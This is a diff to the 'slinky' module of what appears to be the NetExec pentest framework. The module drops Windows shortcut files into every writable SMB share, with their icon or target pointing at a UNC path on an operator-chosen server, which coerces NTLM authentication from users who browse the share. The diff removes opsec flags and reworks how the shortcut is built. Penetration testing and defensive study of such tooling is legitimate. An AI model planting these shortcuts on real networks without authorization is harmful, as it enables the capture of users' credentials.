@@ -14,8 +14,6 @@ class NXCModule:
     name = "slinky"
     description = "Creates windows shortcuts with the icon attribute containing a URI to the specified  server (default SMB) in all shares with write permissions"
     supported_protocols = ["smb"]
-    opsec_safe = False
-    multiple_hosts = True
 
     def __init__(self):
         self.server = None
@@ -68,9 +66,8 @@ class NXCModule:
 
         if not self.cleanup:
             self.server = module_options["SERVER"]
-            link = pylnk3.create(self.local_lnk_path)
-            link.icon = self.ico_uri if self.ico_uri else f"\\\\{self.server}\\icons\\icon.ico"
-            link.save()
+            target_path = f"\\\\{self.server}\\share\\{self.lnk_name}.ico"
+            pylnk3.for_file(target_path, self.local_lnk_path)
 
     def on_login(self, context, connection):
         shares = connection.shares()
